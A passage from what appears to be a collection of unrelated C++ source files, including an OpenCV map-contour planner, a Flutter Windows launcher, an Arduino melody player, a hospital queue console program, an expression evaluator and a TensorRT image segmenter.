cv::threshold(base, base, 128, 255, cv::THRESH_BINARY_INV);\n        cv::findContours(base, contours, cv::RETR_EXTERNAL, cv::CHAIN_APPROX_NONE);\n        obstacle_contours = contours;\n\n        // \u505a\u591a\u8fb9\u5f62\u7684\u62df\u5408\n        std::vector<cv::Point> processed_wall_contour;\n        cv::approxPolyDP(cv::Mat(wall_contours.front()), processed_wall_contour, 1, true);\n        wall_contours = {processed_wall_contour};\n\n        std::vector<std::vector<cv::Point>> processed_obstacle_contours(obstacle_contours.size());\n        for (int i = 0; i < obstacle_contours.size(); i++)\n        {\n            cv::approxPolyDP(cv::Mat(obstacle_contours[i]), processed_obstacle_contours[i], 1, true);\n        }\n        obstacle_contours = processed_obstacle_contours;\n    }\n\n    // \u663e\u793a\u63d0\u53d6\u5230\u7684\u8f6e\u5ed3\n    void CoveragePlanner::showExtractedContours(const cv::Mat &map, const std::vector<std::vector<cv::Point>> &contours)\n    {\n        cv::namedWindow(\"map\", cv::WINDOW_NORMAL);\n        cv::Mat3b canvas = cv::Mat3b(map.size(), CV_8U);\n        canvas.setTo(cv::Scalar(0, 0, 0));\n        for",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_intl_exm\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"BrazoRobotico.h\"\n#include <iostream>\n\n// Constructor\nBrazoRobotico::BrazoRobotico(double x, double y, double z, bool sujetando)\n    : x(x), y(y), z(z), sujetando(sujetando) {}\n\n// M\u00e9todos consultores\ndouble BrazoRobotico::getX() const {\n    return x;\n}\n\ndouble BrazoRobotico::getY() const {\n    return y;\n}\n\ndouble BrazoRobotico::getZ() const {\n    return z;\n}\n\nbool BrazoRobotico::isSujetando() const {\n    return sujetando;\n}\n\n// M\u00e9todos de funcionalidad\nvoid BrazoRobotico::coger() {\n    if (!sujetando) {\n        sujetando = true;\n        std::cout << \"El brazo ha cogido un objeto.\\n\";\n    } else {\n        std::cout << \"El brazo ya est\u00e1 sujetando un objeto.\\n\";\n    }\n}\n\nvoid BrazoRobotico::soltar() {\n    if (sujetando) {\n        sujetando = false;\n        std::cout << \"El brazo ha soltado el objeto.\\n\";\n    } else {\n        std::cout << \"El brazo no est\u00e1 sujetando ning\u00fan objeto.\\n\";\n    }\n}\n\nvoid BrazoRobotico::mover(double newX, double newY, double newZ) {\n    x = newX;\n    y = newY;\n    z = newZ;\n    std::cout << \"El brazo se ha movido a la posici\u00f3n (\" << x << \", \" << y << \", \" << z << \").\\n\";\n}\n\n",
    "#define GLFW_INCLUDE_NONE\n#define GLFW_EXPOSE_NATIVE_COCOA\n#include <GLFW/glfw3.h>\n#include <GLFW/glfw3native.h>\n\n#define NS_PRIVATE_IMPLEMENTATION\n#define CA_PRIVATE_IMPLEMENTATION\n#define MTL_PRIVATE_IMPLEMENTATION\n#include <Foundation/Foundation.hpp>\n#include <Metal/Metal.hpp>\n#include <QuartzCore/QuartzCore.hpp>\n\n// metal-cpp-extensions (modified)\n#include <AppKit/AppKit.hpp>\n\nstatic void quit(GLFWwindow *window, int key, int scancode, int action, int mods);\n\nint main() {\n    glfwInit();\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n\n    auto window = glfwCreateWindow(1280, 720, \"Hello World\", nullptr, nullptr);\n\n    auto nswindow = reinterpret_cast<NS::Window*>(glfwGetCocoaWindow(window));\n    auto device = MTLCreateSystemDefaultDevice();\n    auto commandQueue = device->newCommandQueue();\n    auto layer = CA::MetalLayer::layer();\n    layer->setDevice(device);\n    auto nsview = nswindow->contentView();\n    nsview->setLayer(layer);\n    nsview->setWantsLayer(true);\n    nsview->setOpaque(true);\n\n    glfwSetKeyCallback(window, quit);\n    auto color = MTL::ClearColor::Make(0, 0, 0, 1);\n\n    while (!glfwWindowShouldClose(window)) {\n        glfwPollEvents();\n\n        auto autoReleasePool = NS::AutoreleasePool::alloc()->init();\n        \n        color.red = color.red > 1.0 ? 0.0 : color.red + 0.01;\n\n        auto surface = layer->nextDrawable();\n        auto pass = MTL::RenderPassDescriptor::renderPassDescriptor();\n        auto passColorAttachment0 = pass->colorAttachments()->object(0);\n        passColorAttachment0->setClearColor(color);\n        passColorAttachment0->setLoadAction(MTL::LoadActionClear);\n        passColorAttachment0->setStoreAction(MTL::StoreActionStore);\n        passColorAttachment0->setTexture(surface->texture());\n\n        auto commandBuffer = commandQueue->commandBuffer();\n        auto encoder = commandBuffer->renderCommandEncoder(pass);\n        encoder->endEncoding();\n        commandBuffer->presentDrawable(surface);\n        commandBuffer->commit();\n\n        autoReleasePool->release();\n    }\n\n    commandQueue->release();\n    device->release();\n    \n    glfwDestroyWindow(window);\n    glfwTerminate();\n\n    return 0;\n}\n\nstatic void quit(GLFWwindow *window, int key, int scancode, int action, int mods)\n{\n    if (key == GLFW_KEY_ESCAPE && action == GLFW_PRESS) {\n        glfwSetWindowShouldClose(window, GLFW_TRUE);\n    }\n}",
    "// filepath: /Users/poopi/Documents/Arduino/HollowClock5Plus/SoundPlayer.cpp\n#include \"SoundPlayer.h\"\n#include \"MotorControl.h\"\n#include \"config.h\"\n#include \"pitches.h\"\n\n#if DEBUG_SOUND\n#define TRACE(...) Serial.printf(__VA_ARGS__)\n#define ERROR(...) Serial.printf(__VA_ARGS__)\n#else\n#define TRACE(...)\n#define ERROR(...)\n#endif\n\n// Musics taken from https://github.com/robsoncouto/arduino-songs\n\n#define TUNE_LENGTH(x) (sizeof(x) / sizeof(x[0]) / 2)\n\nstatic const int16_t nokia_ringtone[] = {\n    NOTE_E5,  8, NOTE_D5, 8, NOTE_FS4, 4, NOTE_GS4, 4, NOTE_CS5, 8,\n    NOTE_B4,  8, NOTE_D4, 4, NOTE_E4,  4, NOTE_B4,  8, NOTE_A4,  8,\n    NOTE_CS4, 4, NOTE_E4, 4, NOTE_A4,  2,\n};\n\nstatic const int16_t imperial_march[] = {\n    NOTE_A4,  -4, NOTE_A4, -4, NOTE_A4,  16,  NOTE_A4, 16, NOTE_A4,  16,\n    NOTE_A4,  16, NOTE_F4, 8,  REST,     8,   NOTE_A4, -4, NOTE_A4,  -4,\n    NOTE_A4,  16, NOTE_A4, 16, NOTE_A4,  16,  NOTE_A4, 16, NOTE_F4,  8,\n    REST,     8,  NOTE_A4, 4,  NOTE_A4,  4,   NOTE_A4, 4,  NOTE_F4,  -8,\n    NOTE_C5,  16,\n\n    NOTE_A4,  4,  NOTE_F4, -8, NOTE_C5,  16,  NOTE_A4, 2, // 4\n    NOTE_E5,  4,  NOTE_E5, 4,  NOTE_E5,  4,   NOTE_F5, -8, NOTE_C5,  16,\n    NOTE_A4,  4,  NOTE_F4, -8, NOTE_C5,  16,  NOTE_A4, 2,\n\n    NOTE_A5,  4,  NOTE_A4, -8, NOTE_A4,  16,  NOTE_A5, 4,  NOTE_GS5, -8,\n    NOTE_G5,  16, // 7\n    NOTE_DS5, 16, NOTE_D5, 16, NOTE_DS5, 8,   REST,    8,  NOTE_A4,  8,\n    NOTE_DS5, 4,  NOTE_D5, -8, NOTE_CS5, 16,\n\n    NOTE_C5,  16, NOTE_B4, 16, NOTE_C5,  16,  REST,    8,  NOTE_F4,  8,\n    NOTE_GS4, 4,  NOTE_F4, -8, NOTE_A4,  -16, // 9\n    NOTE_C5,  4,  NOTE_A4, -8, NOTE_C5,  16,  NOTE_E5, 2,\n\n    NOTE_A5,  4,  NOTE_A4, -8, NOTE_A4,  16,  NOTE_A5, 4,  NOTE_GS5, -8,\n    NOTE_G5,  16, // 7\n    NOTE_DS5, 16, NOTE_D5, 16, NOTE_DS5, 8,   REST,    8,  NOTE_A4,  8,\n    NOTE_DS5, 4,  NOTE_D5, -8, NOTE_CS5, 16,\n\n    NOTE_C5,  16, NOTE_B4, 16, NOTE_C5,  16,  REST,    8,  NOTE_F4,  8,\n    NOTE_GS4, 4,  NOTE_F4, -8, NOTE_A4,  -16, // 9\n    NOTE_A4,  4,  NOTE_F4, -8, NOTE_C5,  16,  NOTE_A4, 2,\n};\n\nstatic const int16_t ode_to_joy[] = {\n    NOTE_E4, 4, NOTE_E4, 4, NOTE_F4, 4,  NOTE_G4, 4, // 1\n    NOTE_G4, 4, NOTE_F4, 4, NOTE_E4, 4,  NOTE_D4, 4, NOTE_C4, 4, NOTE_C4, 4,\n    NOTE_D4, 4, NOTE_E4, 4, NOTE_E4, -4, NOTE_D4, 8, NOTE_D4, 2,\n\n    NOTE_E4, 4, NOTE_E4, 4, NOTE_F4, 4,  NOTE_G4, 4, // 4\n    NOTE_G4, 4, NOTE_F4, 4, NOTE_E4, 4,  NOTE_D4, 4, NOTE_C4, 4, NOTE_C4, 4,\n    NOTE_D4, 4, NOTE_E4, 4, NOTE_D4, -4, NOTE_C4, 8, NOTE_C4, 2,\n\n    NOTE_D4, 4, NOTE_D4, 4, NOTE_E4, 4,  NOTE_C4, 4, // 8\n    NOTE_D4, 4, NOTE_E4, 8, NOTE_F4, 8,  NOTE_E4, 4, NOTE_C4, 4, NOTE_D4, 4,\n    NOTE_E4, 8, NOTE_F4, 8, NOTE_E4, 4,  NOTE_D4, 4, NOTE_C4, 4, NOTE_D4, 4,\n    NOTE_G3, 2,\n\n    NOTE_E4, 4, NOTE_E4, 4, NOTE_F4, 4,  NOTE_G4, 4, // 12\n    NOTE_G4, 4, NOTE_F4, 4, NOTE_E4, 4,  NOTE_D4, 4, NOTE_C4, 4, NOTE_C4, 4,\n    NOTE_D4, 4, NOTE_E4, 4, NOTE_D4, -4, NOTE_C4, 8, NOTE_C4, 2};\n\nstatic const int16_t chime[] = {NOTE_G4, 4, NOTE_B4, 4, NOTE_A4, 4, NOTE_D4, 4,\n                                NOTE_G4, 4, NOTE_A4, 4, NOTE_B4, 4, NOTE_G4, 4};\n\nstatic const int16_t beep[] = {NOTE_B4, 8, NOTE_D4, 4};\n\nSoundPlayer::Music music_nokiaTune(nokia_ringtone, TUNE_LENGTH(nokia_ringtone),\n                                   180, 4);\nSoundPlayer::Music music_imperialMarch(imperial_march,\n                                       TUNE_LENGTH(imperial_march), 120, 4);\nSoundPlayer::Music music_odeToJoy(ode_to_joy, TUNE_LENGTH(ode_to_joy), 140, 4);\nSoundPlayer::Music music_chime(chime, TUNE_LENGTH(chime), 180, 2);\nSoundPlayer::Music music_beep(beep, TUNE_LENGTH(beep), 120, 4);\n\nSoundPlayer &SoundPlayer::getInstance() {\n  static SoundPlayer instance;\n  return instance;\n}\n\nSoundPlayer::SoundPlayer() {\n  // Initialize sound player hardware or library here\n}\n\nint SoundPlayer::calculateWholeNoteDuration(int tempo,\n                                            int timeSignatureDenominator) {\n  // Calculate the duration of a whole note in milliseconds\n  // Formula: (60000 ms per minute * 4 beats per whole note) / (tempo in beats\n  // per minute) Adjust for time signature: multiply by\n  // (timeSignatureDenominator / 4) Simplifying: 60000 *\n  // timeSignatureDenominator / tempo\n  if (tempo) {\n    return 60000 * timeSignatureDenominator / tempo;\n  } else {\n    return 1000;\n  }\n}\n\nvoid SoundPlayer::playMusic(Music music, bool pause_after_note) {\n  int wholenote = calculateWholeNoteDuration(music.bpm, music.tsd);\n  int note_type = 0, notelen = 0;\n\n  for (int note = 0; note < music.length * 2; note = note + 2) {\n    note_type = music.notes[note + 1];\n    if (note_type > 0) {\n      notelen = (wholenote) / note_type;\n    } else if (note_type < 0) {\n      notelen = (wholenote) / abs(note_type);\n      notelen *= 1.5;\n    }\n\n    MotorControl::getInstance().playSound(music.notes[note], notelen);\n    if (pause_after_note) {\n      delay(notelen);\n    }\n  }\n}\n\nvoid SoundPlayer::playMusic(soundplayer_music_t music) {\n  // Play the selected music\n  switch (music) {\n  case MUSIC_NOKIA_RINGTONE:\n    ",
    "#include<iostream>\r\n#include<string>\r\n#include\"\u83dc\u5355.h\"\r\n#include\"\u961f\u5217.h\"\r\n#include\"\u663e\u793a\u4fe1\u606f.h\"\r\nusing namespace std;\r\n\r\nint main() {\r\n\tint switch_on = 0;\r\n\tstring name_;\r\n\tdouble id_;\r\n\t\r\n\tLinkQueue Q;\r\n\tInitQueue(Q);\r\n\t\r\n\twhile (true)\r\n\t{\r\n\tint flag = 1;\r\n\tstring key;\r\n\t\tmean();\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u4f60\u9700\u8981\u7684\u6570\u5b57\" << endl;\r\n\t\tcin >> switch_on;\r\n\r\n\t\tswitch (switch_on)\r\n\t\t{\r\n\t\tcase 1:\r\n\r\n\t\t\twhile (flag) {\r\n\t\t\t\tcout << \"\u8bf7\u8f93\u5165\u4f60\u7684\u540d\u5b57\" << endl;\r\n\t\t\t\tcin >> name_;\r\n\t\t\t\tcout << \"\u8bf7\u8f93\u5165\u4f60\u7684\u75c5\u5386\u53f7\" << endl;\r\n\t\t\t\tcin >> id_;\r\n\r\n\t\t\t\tEnQueue(Q, name_, id_);//\u6392\u961f--\u8f93\u4eba\u6392\u961f\u75c5\u4eba\u7684\u75c5\u5386\u53f7\uff0c\u52a0\u5165\u5230\u75c5\u4eba\u6392\u961f\u961f\u5217\u4e2d\r\n\t\t\t\tpatient_show(Q.rear);\r\n\r\n\t\t\t\tstd::cout << \"\u5df2\u52a0\u5165\u5230\u75c5\u4eba\u6392\u961f\u961f\u5217\u4e2d\" << std::endl;\r\n\r\n\r\n\t\t\t\tcout << \"\u5b8c\u6210\u4e86\u5417\uff1f\u8f93\u5165\uff1a\u662f\uff1f\u5426\" << endl;\r\n\t\t\t\tcin >> key;\r\n\t\t\t\tif (!key.compare(\"\u662f\"))\r\n\t\t\t\t\t\r\n\t\t\t\t{\r\n\r\n\t\t\t\t\tflag = 0;\r\n\t\t\t\t}\r\n\t\t\t\r\n\t\t\t}\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tbreak;\r\n\t\tcase 2:       //2\uff1a\u5c31\u8bca--\u75c5\u4eba\u6392\u961f\u961f\u5217\u4e2d\u6700\u524d\u9762\u7684\u75c5\u4eba\u5c31\u8bca\uff0c\u5e76\u5c06\u5176\u4ece\u961f\u5217\u4e2d\u5220\u9664\r\n\t\t\tdeletefront_QNode(Q);\r\n\t\t\tstd::cout << \"\u5df2\u5c31\u533b\u5b8c\u6210\u4e86\" << std::endl;\r\n\t\t\tsystem(\"pause\");\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tbreak;\r\n\t\tcase 3:    //3\uff1a\u67e5\u770b\u6392\u961f--\u4ece\u961f\u9996\u5230\u961f\u5c3e\u5217\u51fa\u6240\u6709\u7684\u6392\u961f\u75c5\u4eba\u7684\u75c5\u5386\u53f7\u3002\r\n\t\t\ttraversal(Q);\r\n\t\t\tsystem(\"pause\");\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tbreak;\r\n\t\tcase 4://\t4\uff1a\u4e0d\u518d\u6392\u961f\uff0c\u4f59\u4e0b\u4f9d\u6b21\u5c31\u8bca--\u4ece\u961f\u9996\u5230\u961f\u5c3e\u5217\u51fa\u6240\u6709\u7684\u6392\u961f\u75c5\u4eba\u7684\u75c5\u5386\u53f7\uff0c\u5e76\u9000\u51fa\u8fd0\u884c\r\n\t\t\ttraversal(Q);\r\n\t\t\tDestoryQueue(Q);\r\n\r\n\t\t\tsystem(\"pause\");\r\n\t\t\treturn 0;\r\n\t\t\tbreak;\r\n\t\tcase 5:           //\r\n\t\t\tsystem(\"pause\");\r\n\t\t\treturn 0;\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t\r\n\t}\r\n\r\n\r\n\r\n\r\n\tsystem(\"pause\");\r\n\treturn 0;\r\n}",
    "#include \"headers/thread_safe_logger.hpp\"\n#include \"headers/file_logging_strategy.hpp\"\n#include <format>\n#include <thread>\n#include <vector>\n#include <utility>\n\nusing namespace std;\n\nvoid logSomeMessages(int id, ThreadSafeLogger& logger)\n{\n\tfor (int i{ 0 }; i < 10; ++i) {\n        std::string message = \"Hello from thread: \" + std::to_string(id) + \" and iteration # \" + std::to_string(i) ;\n        logger.log( message,  i%3 ==0 ?LogType::ERROR_DEBUG : i%2 ==0 ? LogType::WARNING_DEBUG :  LogType::INFO_DEBUG, __FILE__, __LINE__);\n\t\tthis_thread::sleep_for(50ms);\n\t}\n    \n}\n\nint main()\n{\n\tstd::unique_ptr<FileLoggingStrategy> strategy = std::make_unique<FileLoggingStrategy>(\"log_file.txt\");\n\tauto& logger = ThreadSafeLogger::getInstance(std::move(strategy));\n\n    logger.startLoggingThread() ;\n\tvector<thread> threads;\n\t// Create a few threads all working with the same Logger instance.\n\tfor (int i{ 0 }; i < 10; ++i) {\n\t\tthreads.emplace_back(logSomeMessages, i, ref(logger));\n\t}\n    for (int i{ 0 }; i < 10; ++i) {\n\t\tthreads[i].join();\n\t}\n}",
    "#include <cmath>\n#include <iostream>\n#include <stack>\n#include <string>\n#include <sstream>\n#include <vector>\n#include <variant>\n#include <stdexcept>\n#include <cctype>\n#include <unordered_map>\n#include <algorithm>\n\nconstexpr int MAX_INPUT_SIZE = 100;\n\nstruct Number { double value; };\nstruct Operator { char symbol; };\nstruct Parenthesis { char symbol; };\nusing Token = std::variant<Number, Operator, Parenthesis>;\n\nconstexpr int precedence(const char op) {\n    switch (op) {\n        case '^': return 3;\n        case '*': case '/': return 2;\n        case '+': case '-': return 1;\n        default: return 0;\n    }\n}\n\ndouble apply_operator(const double a, const double b, const char op) {\n    switch (op) {\n        case '+': return a + b;\n        case '-': return a - b;\n        case '*': return a * b;\n        case '/': if (b == 0) throw std::runtime_error(\"Division by zero\"); return a / b;\n        case '^': return std::pow(a, b);\n        default: throw std::invalid_argument(\"Unknown operator\");\n    }\n}\n\nstd::vector<Token> tokenize(const std::string& expr) {\n    std::vector<Token> tokens;\n    std::istringstream stream(expr);\n    char ch;\n    while (stream >> ch) {\n        if (std::isdigit(ch) || ch == '.') {\n            stream.putback(ch);\n            double num;\n            stream >> num;\n            tokens.emplace_back(Number{num});\n        } else if (std::strchr(\"+-*/^\", ch)) {\n            tokens.emplace_back(Operator{ch});\n        } else if (ch == '(' || ch == ')') {\n            tokens.emplace_back(Parenthesis{ch});\n        }\n    }\n    return tokens;\n}\n\nstd::vector<Token> infix_to_postfix(const std::vector<Token>& tokens) {\n    std::vector<Token> postfix;\n    std::stack<Token> operators;\n    for (const auto& token : tokens) {\n        if (std::holds_alternative<Number>(token)) {\n            postfix.push_back(token);\n        } else if (std::holds_alternative<Operator>(token)) {\n            const char op = std::get<Operator>(token).symbol;\n            while (!operators.empty() && std::holds_alternative<Operator>(operators.top())) {\n                if (const char top_op = std::get<Operator>(operators.top()).symbol; precedence(top_op) >= precedence(op)) {\n                    postfix.push_back(operators.top());\n                    operators.pop();\n                } else {\n                    break;\n                }\n            }\n            operators.push(token);\n        } else if (std::get<Parenthesis>(token).symbol == '(') {\n            operators.push(token);\n        } else if (std::get<Parenthesis>(token).symbol == ')') {\n            while (!operators.empty() && !std::holds_alternative<Parenthesis>(operators.top())) {\n                postfix.push_back(operators.top());\n                operators.pop();\n            }\n            operators.pop();\n        }\n    }\n    while (!operators.empty()) {\n        postfix.push_back(operators.top());\n        operators.pop();\n    }\n    return postfix;\n}\n\ndouble evaluate_postfix(const std::vector<Token>& tokens) {\n    std::stack<double> values;\n    for (const auto& token : tokens) {\n        if (std::holds_alternative<Number>(token)) {\n            values.push(std::get<Number>(token).value);\n        } else if (std::holds_alternative<Operator>(token)) {\n            const auto op = std::get<Operator>(token).symbol;\n            const auto b = values.top(); values.pop();\n            const auto a = values.top(); values.pop();\n            values.push(apply_operator(a, b, op));\n        }\n    }\n    return values.top();\n}\n\nint main() {\n    std::string input;\n    std::cout << \"Welcome to SMEP, the simplest math evaluation program.\\n\";\n    std::cout << \"Enter an expression (type help to see the instructions).\\n\";\n    while (true) {\n        std::cout << \"SIC>\";\n        std::getline(std::cin, input);\n\n        if (input == \"exit\") break;\n        if (input == \"help\") {\n            std::cout << \"-----HELP-----\\nSupported symbols: +, -, /, ^, *\\nTo exit type 'exit'\\nTo see the version type 'version'\\n\";\n            continue;\n        }\n        if (input == \"version\") {\n            std::cout << \"SMEP version 1.0! First release!\\n\";\n            continue;\n        }\n\n        try {\n            auto tokens = tokenize(input);\n            auto postfix = infix_to_postfix(tokens);\n            const auto result = evaluate_postfix(postfix);\n            std::cout << \"Result: \" << result << std::endl;\n        } catch (const std::exception& e) {\n            std::cerr << \"Error: \" << e.what() << std::endl;\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"Segmenter.h\"\r\n#include <filesystem>\r\n\r\nSegmenter::Segmenter(const std::string& configPath)\r\n    : mEngine(nullptr)\r\n    , mRuntime(nullptr)\r\n    , mContext(nullptr)\r\n    , mStream(nullptr)\r\n    , mInputSize(0)\r\n    , mOutputSize(0)\r\n    , mInputIndex(-1)\r\n    , mOutputIndex(-1)\r\n{\r\n    // 1. \u52a0\u8f7dINI\u914d\u7f6e  \r\n    std::map<std::string, std::string> configMap = loadConfig(configPath);\r\n    mEnginePath = configMap[\"model.engine_path\"];\r\n    mImagePath = configMap[\"input.image_path\"];\r\n    mImageFolder = configMap[\"input.image_folder\"];\r\n    mOutputPath = configMap[\"output.outputPath\"];\r\n    mOutputFolder = configMap[\"output.outputFolder\"];\r\n\r\n    std::cout << \"[\u914d\u7f6e\u8bfb\u53d6] \u6a21\u578b\u8def\u5f84: \" << mEnginePath << std::endl;\r\n    std::cout << \"[\u914d\u7f6e\u8bfb\u53d6] \u56fe\u50cf\u76ee\u5f55: \" << mImagePath << std::endl;\r\n    std::cout << \"[\u914d\u7f6e\u8bfb\u53d6] \u56fe\u50cf\u8def\u5f84: \" << mImageFolder << std::endl;\r\n    std::cout << \"[\u914d\u7f6e\u8bfb\u53d6] \u56fe\u50cf\u4fdd\u5b58\u8def\u5f84: \" << mOutputPath << std::endl;\r\n    std::cout << \"[\u914d\u7f6e\u8bfb\u53d6] \u7ed3\u679c\u8f93\u51fa\u8def\u5f84: \" << mOutputFolder << std::endl;\r\n\r\n    // 2. \u521d\u59cb\u5316TensorRT      \r\n    initializeTensorRT();  \r\n    // 3. \u63a8\u7406\u76f8\u5173\u521d\u59cb\u5316        \r\n    inferInit();                  \r\n}\r\n\r\nSegmenter::~Segmenter() {\r\n    // \u91ca\u653e GPU \u5185\u5b58\r\n    for (void* buf : mBuffers) {\r\n        if (buf) cudaFree(buf);\r\n    }\r\n    mBuffers.clear();\r\n\r\n    if (mStream) {\r\n        cudaStreamDestroy(mStream);\r\n        mStream = nullptr;\r\n    }\r\n\r\n    // \u91ca\u653e TensorRT \u76f8\u5173\u8d44\u6e90\r\n    if (mContext) {\r\n        mContext->destroy();\r\n        mContext = nullptr;\r\n    }\r\n    if (mEngine) {\r\n        mEngine->destroy();\r\n        mEngine = nullptr;\r\n    }\r\n    if (mRuntime) {\r\n        mRuntime->destroy();\r\n        mRuntime = nullptr;\r\n    }\r\n\r\n    std::cout << \"[Segmenter] \u8d44\u6e90\u5df2\u91ca\u653e\" << std::endl;\r\n}\r\n\r\nstd::vector<cv::Mat> Segmenter::readImagesFromFolder(const std::string& folderPath) {\r\n    std::vector<cv::Mat> images;\r\n\r\n    std::cout << \"[\u56fe\u50cf\u8bfb\u53d6] \u5f00\u59cb\u8bfb\u53d6\u56fe\u50cf...\" << std::endl;\r\n    std::cout << \"[\u56fe\u50cf\u8bfb\u53d6] \u8bfb\u53d6\u56fe\u50cf\u8def\u5f84: \" << folderPath << std::endl;\r\n\r\n    for (const auto& entry : std::filesystem::directory_iterator(folderPath)) {\r\n        if (entry.is_regular_file()) {\r\n            std::string imagePath = entry.path().string();\r\n            cv::Mat readImage = cv::imread(imagePath);\r\n\r\n            if (readImage.empty()) {\r\n                throw std::runtime_error(\"[\u56fe\u50cf\u8bfb\u53d6] \u8bfb\u53d6\u56fe\u50cf\u5931\u8d25: \" + imagePath);\r\n                continue; // \u8df3\u8fc7\u65e0\u6cd5\u8bfb\u53d6\u7684\u6587\u4ef6\r\n            }\r\n\r\n            images.push_back(readImage);\r\n        }\r\n    }\r\n\r\n    if (images.empty()) {\r\n        std::cerr << \"[\u56fe\u50cf\u8bfb\u53d6] \u6ca1\u6709\u627e\u5230\u4efb\u4f55\u56fe\u50cf\u6587\u4ef6\u3002\" << std::endl;\r\n    }\r\n\r\n    return images;\r\n}\r\n\r\nvoid Segmenter::doInference(int loopCount) {\r\n\r\n    std::string imagePath=mImagePath;\r\n    std::string outputPath=mOutputPath;\r\n\r\n    // 1. \u8bfb\u53d6\u56fe\u50cf\r\n    std::cout << \"[\u56fe\u50cf\u8bfb\u53d6] \u5f00\u59cb\u8bfb\u53d6\u56fe\u50cf...\" << std::endl;\r\n    std::cout << \"[\u56fe\u50cf\u8bfb\u53d6] \u8bfb\u53d6\u56fe\u50cf\u8def\u5f84: \" << imagePath << std::endl;\r\n\r\n    cv::Mat readImage = cv::imread(imagePath);\r\n    if (readImage.empty()) {\r\n        throw std::runtime_error(\"[\u56fe\u50cf\u8bfb\u53d6] \u8bfb\u53d6\u56fe\u50cf\u5931\u8d25: \" + imagePath);\r\n    }\r\n\r\n    // 2. \u9884\u5904\u7406\u56fe\u50cf (HWC -> CHW, resize, normalize)\r\n    cv::Mat inputImage = preprocessImage(readImage, mInputDims, true,\"image\");\r\n\r\n    // 3. \u591a\u6b21\u63a8\u7406\r\n    for (int i = 0; i < loopCount; ++i) {\r\n        // \u6784\u9020\u4e00\u4e2a\u8f93\u51faMat\uff0c\u7528\u4e8e\u4fdd\u5b58\u63a8\u7406\u7ed3\u679c\r\n        cv::Mat outputMask(mOutputDims.d[3], mOutputDims.d[2], CV_32FC1);\r\n\r\n        // \u6267\u884c\u4e00\u6b21\u63a8\u7406\r\n        runInference(1,inputImage, outputMask);\r\n\r\n        // 4. \u540e\u5904\u7406\u5e76\u4fdd\u5b58\u8f93\u51fa\u7ed3\u679c\r\n        postprocessOutput(outputMask, outputPath,true);\r\n    }\r\n}\r\n\r\nvoid Segmenter::doInferenceBatch(bool saveProcessImage,bool saveOutputImage,int loopCount) {\r\n\r\n    std::string imagePath=mImageFolder;\r\n    std::string outputPath=mOutputPath;\r\n\r\n    // 1. \u8bfb\u53d6\u56fe\u50cf\r\n    std::vector<cv::Mat> images=readImagesFromFolder(imagePath);\r\n    if (images.empty()) {\r\n        throw std::runtime_error(\"[\u6279\u91cf\u63a8\u7406] \u6ca1\u6709\u53ef\u7528\u7684\u56fe\u50cf\u8fdb\u884c\u63a8\u7406\");\r\n    }\r\n\r\n    // 2. \u9884\u5904\u7406\u56fe\u50cf (HWC -> CHW, resize, normalize)\r\n    int  batchSize = images.size();\r\n    cv::Mat batchInput = preprocessBatch(images, mInputDims, batchSize,saveProcessImage);\r\n\r\n    // \u5224\u65ad\u8f93\u5165\u56fe\u50cf\u662f\u5426\u4e3a\u7a7a\r\n    if (batchInput.empty()) {\r\n        throw std::runtime_error(\"[\u6279\u91cf\u63a8\u7406] \u9884\u5904\u7406\u56fe\u50cf\u5931\u8d25\");\r\n    }\r\n\r\n    // 3. \u521b\u5efa\u6279\u91cf\u8f93\u51fa\u5bb9\u5668\r\n    int outputVolume = m_outputDimsVec[0].d[1] * m_outputDimsVec[0].d[2] * m_outputDimsVec[0].d[3];\r\n    cv::Mat batchOutput(batchSize * outputVolume, 1, CV_32FC1);\r\n\r\n    // 4. \u6267\u884c\u6279\u91cf\u63a8\u7406\r\n    for (size_t i = 0; i < loopCount; i++)\r\n    {\r\n        runInference(batchSize, batchInput, batchOutput);\r\n    }\r\n    \r\n    // 5. \u540e\u5904\u7406\u6bcf\u4e2a\u56fe\u50cf\r\n    for (int i = 0; i < batchSize; ++i) {\r\n        // \u6bcf\u4e2a batch \u7684\u8f93\u51fa\u6570\u636e\u8d77\u59cb\u5730\u5740\r\n        float* batchStart = batchOutput.ptr<float>() + i * outputVolume;\r\n\r\n        // \u521b\u5efa\u5355\u4e2a batch \u7684 Mat\r\n        cv::Mat outputImage(m_outputDimsVec[0].d[2], m_outputDimsVec[0].d[3], CV_32FC1, batchStart);\r\n\r\n        // \u6784\u5efa\u8f93\u51fa\u8def\u5f84\r\n        std::string outputFilePath = mOutputFolder + \"/batch_\" + std::to_string(i) + \".jpg\";\r\n\r\n        // \u540e\u5904\u7406\u5e76\u4fdd\u5b58\r\n        postprocessOutput(outputImage, outputFilePath,saveOutputImage);\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::string> Segmenter::loadConfig(const std::string& configPath) {\r\n    std::cout << \"[Segmente",
